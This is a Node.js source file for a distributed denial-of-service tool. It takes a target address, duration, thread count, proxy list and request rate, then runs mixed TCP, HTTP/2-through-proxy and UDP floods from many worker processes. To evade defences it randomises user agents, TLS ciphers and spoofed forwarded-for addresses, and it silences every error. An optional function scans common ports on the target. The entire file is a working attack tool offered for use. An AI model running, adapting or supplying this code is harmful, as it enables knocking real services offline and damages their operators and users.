const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    https = require('https'),
    tls = require('tls'),
    net = require('net'),
    cluster = require('cluster'),
    fakeua = require('fake-useragent'),
    randstr = require('randomstring');

// Cipher suites for TLS
const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS"
];

// Headers for requests
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

const lang_header = [
    'en-US,en;q=0.9', 'es-ES,es;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'
];

// Header functions
const headerFunc = {
  accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
  },
  lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
  },
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  }
}

// Generate random IP
function randomIp() {
  let segments = [];
  for (let i = 0; i < 4; i++) {
    segments.push(Math.floor(Math.random() * 256));
  }
  return segments.join('.');
}

// Error handling
process.on('uncaughtException', function (e) {
    // Suppress errors
}).on('unhandledRejection', function (e) {
    // Suppress errors
}).setMaxListeners(0);

// Get command line arguments
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
    console.log('Usage: node script.js <IP:PORT> <TIME> <THREADS> <PROXY_FILE> <RPS>');
    console.log('Example: node script.js 192.168.1.1:80 60 10 proxies.txt 100');
    process.exit(1);
}

// Parse target IP and port
let targetIP, targetPort;
if (target.includes(':')) {
    [targetIP, targetPort] = target.split(':');
    targetPort = parseInt(targetPort);
} else {
    targetIP = target;
    targetPort = 80; // Default HTTP port
}

// Load proxies
let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.split('\n').filter(line => line.trim() !== '');
} catch (err) {
    console.error('Error reading proxy file:', err.message);
    process.exit(1);
}

const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
    console.log(`🚀 Starting IP Attack | Target: ${targetIP}:${targetPort} | Time: ${time}s | Threads: ${thread} | RPS: ${rps} | Proxies: ${proxys.length}`);
    
    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        console.log('✅ Attack completed');
        process.exit(0);
    }, time * 1000);
    
} else {
    // TCP Flood Attack
    function tcpFlood() {
        try {
            const socket = new net.Socket();
            const proxy = proxyr().split(':');
            
            socket.connect(parseInt(proxy[1]), proxy[0], () => {
                // Send HTTP request through proxy
                const request = 
                    `GET http://${targetIP}:${targetPort}/ HTTP/1.1\r\n` +
                    `Host: ${targetIP}\r\n` +
                    `User-Agent: ${fakeua()}\r\n` +
                    `Accept: ${headerFunc.accept()}\r\n` +
                    `Accept-Language: ${headerFunc.lang()}\r\n` +
                    `X-Forwarded-For: ${randomIp()}\r\n` +
                    `Connection: keep-alive\r\n` +
                    `\r\n`;
                
                socket.write(request);
            });
            
            socket.setTimeout(5000);
            socket.on('timeout', () => socket.destroy());
            socket.on('error', () => socket.destroy());
            socket.on('data', () => socket.destroy());
            
        } catch (e) {
            // Suppress errors
        }
    }

    // HTTP/2 Attack
    function http2Flood() {
        try {
            const proxy = proxyr().split(':');
            const ua = fakeua();
            
            const headers = {
                ':method': 'GET',
                ':authority': targetIP,
                ':path': '/',
                ':scheme': 'https',
                'user-agent': ua,
                'accept': headerFunc.accept(),
                'accept-language': headerFunc.lang(),
                'x-forwarded-for': randomIp()
            };

            const req = http.request({
                host: proxy[0],
                port: proxy[1],
                method: 'CONNECT',
                path: `${targetIP}:443`,
                headers: {
                    'Host': targetIP,
                    'User-Agent': ua,
                    'Proxy-Connection': 'Keep-Alive'
                }
            });

            req.on('connect', (res, socket) => {
                const tlsSocket = tls.connect({
                    socket: socket,
                    host: targetIP,
                    port: 443,
                    servername: targetIP,
                    ciphers: headerFunc.cipher(),
                    rejectUnauthorized: false
                }, () => {
                    const client = http2.connect(`https://${targetIP}`, {
                        createConnection: () => tlsSocket
                    });

                    client.on('connect', () => {
                        for (let i = 0; i < 5; i++) {
                            try {
                                const request = client.request(headers);
                                request.on('response', () => request.close());
                                request.end();
                            } catch (e) {}
                        }
                    });

                    client.on('error', () => {});
                });

                tlsSocket.on('error', () => {});
            });

            req.on('error', () => {});
            req.end();
            
        } catch (e) {}
    }

    // UDP Flood (for DNS/other UDP services)
    function udpFlood() {
        try {
            const dgram = require('dgram');
            const socket = dgram.createSocket('udp4');
            const message = Buffer.from('test packet');
            
            // Send UDP packet directly to target
            socket.send(message, targetPort, targetIP, (err) => {
                socket.close();
            });
            
        } catch (e) {}
    }

    // Mixed attack - uses all methods
    function mixedAttack() {
        const attackType = Math.floor(Math.random() * 3);
        
        switch(attackType) {
            case 0:
                tcpFlood();
                break;
            case 1:
                http2Flood();
                break;
            case 2:
                udpFlood();
                break;
        }
    }

    // Start attacks
    const attackInterval = setInterval(mixedAttack, 1000 / rps);
    
    // Stop when time is up
    setTimeout(() => {
        clearInterval(attackInterval);
        process.exit(0);
    }, time * 1000);
}

// Additional port scanning function
function scanPorts() {
    const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 587, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 8080, 8443];
    
    commonPorts.forEach(port => {
        const socket = new net.Socket();
        socket.setTimeout(2000);
        
        socket.connect(port, targetIP, () => {
            console.log(`✅ Port ${port} OPEN on ${targetIP}`);
            socket.destroy();
        });
        
        socket.on('timeout', () => socket.destroy());
        socket.on('error', () => socket.destroy());
    });
}

// Uncomment to scan ports before attack
// scanPorts();